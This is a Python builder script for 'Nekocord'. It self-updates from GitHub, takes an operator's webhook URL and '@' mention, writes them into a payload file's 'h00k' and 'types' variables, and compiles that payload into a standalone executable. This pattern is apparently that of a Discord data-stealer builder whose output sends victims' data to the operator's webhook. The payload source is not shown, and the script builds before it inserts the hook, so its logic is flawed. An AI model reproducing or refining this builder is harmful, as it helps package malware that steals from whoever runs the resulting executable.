import subprocess
import colorama
from colorama import Fore
import os
import requests
import zipfile
from io import BytesIO
import shutil

colorama.init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

ascii_art = """
                        ███╗   ██╗███████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
                        ████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                        ██╔██╗ ██║█████╗  █████╔╝ ██║   ██║██║     ██║   ██║██████╔╝██║  ██║
                        ██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║██║     ██║   ██║██╔══██╗██║  ██║
                        ██║ ╚████║███████╗██║  ██╗╚██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
                        ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
"""

def remote_v_string():
    url = "https://raw.githubusercontent.com/zakocord/Nekocord/main/extra/v_string"
    response = requests.get(url)
    response.raise_for_status()
    return response.text.strip()

def get_v_string():
    try:
        with open("extra/v_string", 'r') as file:
            return file.read().strip()
    except FileNotFoundError:
        return None

def download_and_extract_zip():
    version = remote_v_string()
    print(f"{Fore.YELLOW}[INFO] Downloading version {version}...")

    response = requests.get("https://github.com/zakocord/Nekocord/archive/refs/heads/main.zip")
    response.raise_for_status()

    with zipfile.ZipFile(BytesIO(response.content)) as zip_ref:
        zip_ref.extractall("_temp")

def replace_current_folder(remote_v):
    print(f"{Fore.YELLOW}[INFO] Replacing current folder files...")
    source_dir = "_temp/Nekocord-main"

    for item in os.listdir(source_dir):
        s = os.path.join(source_dir, item)
        d = os.path.join(".", item)
        if os.path.isdir(s):
            if os.path.exists(d):
                shutil.rmtree(d)
            shutil.copytree(s, d)
        else:
            shutil.copy2(s, d)

    with open("extra/v_string", "w") as f:
        f.write(remote_v)

    shutil.rmtree("_temp")
    print(f"{Fore.GREEN}[INFO] Update complete!")

def update():
    remote_v = remote_v_string()
    local_v = get_v_string()

    if local_v != remote_v:
        os.system("title Update Available")
        print(f"{Fore.CYAN}[INFO] Update available: {local_v or 'None'} → {remote_v}")
        choice = input("Update? (y/n): ").strip().lower()
        if choice == 'y':
            download_and_extract_zip()
            replace_current_folder(remote_v)
        else:
            print("Update cancelled.")
            os.system("cls")
            os.system("title nekocord")
    else:
        print(f"{Fore.YELLOW}[INFO] No updates available, version: {local_v}")

def build_exe(build_tool, command):
    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Building with {build_tool}...")

    try:
        subprocess.run(command, check=True)
        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully built the executable.")
    except subprocess.CalledProcessError:
        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build the executable. Ensure {build_tool} is installed.")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} {build_tool} is not found. Please install it.")

def replace_hook_in_main():
    while True:
        print(f"{Fore.LIGHTMAGENTA_EX}{ascii_art}")
        new_hook = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\nWebhook URL: ").strip()
        mention = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\nMENTION: ").strip()

        if not new_hook.startswith("https://"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The webhook entered is not valid. Please try again.")
            os.system("pause" if os.name == "nt" else "read -p 'Press enter to continue...'")
            os.system("cls" if os.name == "nt" else "clear")
            continue
        
        if not mention.startswith("@"):
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The mention should start with '@'. Please try again.")
            continue

        buildtype = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\n Build Type  [Nuitka/Pyinstaller]: ").strip().lower()

        if buildtype in ["nuitka", "pyinstaller"]:
            confirm_build = input(f"{Fore.CYAN}[INFO] {Fore.RESET} Do you want to build with {buildtype}? (y/n): ").strip().lower()
            if confirm_build == "y":
                if buildtype in ["py", "pyinstaller"]:
                    build_exe("PyInstaller", ["pyinstaller", "--onefile", "src/asset/nekocord.py"])
                else:
                    build_exe("Nuitka", ["nuitka", "--onefile", "src/asset/nekocord.py"])


            else:
                print(f"{Fore.YELLOW}[INFO] {Fore.RESET} Build cancelled.")
                continue

        break

    try:
        file_path = "src/asset/nekocord.py"

        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()

        content = content.replace('h00k = ""', f'h00k = "{new_hook}"')
        content = content.replace('types = ""', f'types = "{mention}"')

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(content)

        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET} Successfully replaced the webhook and mention.")
    
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} The file 'src/asset/nekocord.py' was not found.")
    except IOError as e:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} Error reading/writing the file: {e}")

if __name__ == "__main__":
    update()
    replace_hook_in_main()
